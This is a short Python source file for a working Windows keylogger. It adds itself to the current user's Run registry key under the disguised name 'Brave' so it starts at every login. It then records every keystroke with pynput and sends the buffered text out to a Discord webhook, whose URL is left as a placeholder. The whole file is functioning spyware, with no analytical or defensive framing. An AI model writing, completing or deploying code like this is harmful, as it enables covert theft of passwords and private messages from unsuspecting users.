import pynput
from pynput.keyboard import Key, Listener
from discord_webhook import DiscordWebhook
import winreg
import sys

webhook_url = 'webhook' # webhook here
registry_name = 'Brave'
keys_buffer = ''

winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run")
registry_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_WRITE)
winreg.SetValueEx(registry_key, registry_name, 0, winreg.REG_SZ, sys.argv[0])
winreg.CloseKey(registry_key)

def send_message(message):
    DiscordWebhook(url=webhook_url, content=message).execute()

def on_press(key):     # Executes on each key pressed
    global keys_buffer
    if str(key)[:4] == 'Key.':
        key = ' `[' + str(key) + ']`'
    else:
        key = str(key)[1]
    if len(keys_buffer) + len(key) >= 1975 or key == ' `[Key.enter]`':
        send_message(keys_buffer + key)
        keys_buffer = ''
    else:
        keys_buffer += key

with Listener(on_press=on_press) as listener:
    listener.join()
